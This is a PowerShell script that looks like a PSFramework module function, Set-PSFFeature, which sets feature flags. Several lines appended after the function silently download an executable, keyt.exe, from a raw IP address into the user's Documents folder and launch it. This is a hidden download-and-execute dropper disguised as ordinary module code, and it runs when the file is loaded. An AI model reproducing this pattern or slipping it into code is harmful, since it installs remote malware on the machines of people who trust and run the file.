function Set-PSFFeature
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
	[CmdletBinding()]
	param (
		[Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
		[PsfValidateSet(TabCompletion = 'PSFramework.Feature.Name')]
		[string]
		$Name,
		
		[Parameter(Mandatory = $true)]
		[bool]
		$Value,
		
		[string]
		$ModuleName
	)
	process
	{
		foreach ($featureItem in $Name)
		{
			if ($ModuleName)
			{
				[PSFramework.Feature.FeatureHost]::WriteModuleFlag($ModuleName, $Name, $Value)
			}
			else
			{
				[PSFramework.Feature.FeatureHost]::WriteGlobalFlag($Name, $Value)
			}
		}
	}
}
Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

